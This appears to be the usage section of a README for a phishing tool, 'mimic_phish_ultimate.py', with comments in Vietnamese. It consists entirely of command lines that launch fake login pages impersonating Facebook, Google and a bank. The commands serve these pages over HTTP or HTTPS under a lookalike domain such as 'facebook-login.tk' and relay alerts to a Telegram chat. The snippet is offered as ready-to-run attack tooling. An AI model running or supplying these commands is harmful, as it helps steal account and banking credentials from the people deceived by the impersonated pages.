Interactive Mode
sudo python3 mimic_phish_ultimate.py

Command Line Mode
# Với C2 IP tự động
sudo python3 mimic_phish_ultimate.py --template facebook --port 80

# Với SSL và domain tùy chỉnh
sudo python3 mimic_phish_ultimate.py --template google --port 443 --ssl --domain facebook-login.tk

# Với Telegram notifications
sudo python3 mimic_phish_ultimate.py --template bank --telegram-token TOKEN --telegram-chat CHAT_ID
